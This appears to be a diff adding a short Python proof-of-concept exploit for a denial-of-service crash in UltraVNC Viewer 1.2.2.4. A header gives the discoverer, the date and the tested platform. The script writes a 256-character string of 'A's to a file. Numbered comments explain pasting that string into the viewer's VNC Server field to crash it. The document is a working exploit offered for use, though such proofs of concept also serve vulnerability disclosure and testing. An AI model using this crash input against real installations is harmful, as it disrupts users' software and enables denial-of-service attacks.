@@ -1,0 +1,21 @@
+#Exploit Title: UltraVNC Viewer 1.2.2.4 - Denial of Service (PoC)
+#Discovery by: Victor Mondragón
+#Discovery Date: 2019-04-14
+#Vendor Homepage: https://www.uvnc.com/
+#Software Link: https://www.uvnc.com/downloads/ultravnc/126-download-ultravnc-1224.html
+#Tested Version: 1.2.2.4
+#Tested on: Windows 7 x64 Service Pack 1
+
+#Steps to produce the crash:
+#1.- Run python code: UltraVNC_Viewer_1.2.2.4.py
+#2.- Open UltraViewer.txt and copy content to clipboard
+#3.- Open UltraVNC Viewer 
+#4.- In "VNC Server" Paste Clipboard
+#5.- Click on "Connect"
+#6.- Crashed
+
+cod = "\x41" * 256
+
+f = open('UltraViewer.txt', 'w')
+f.write(cod)
+f.close()
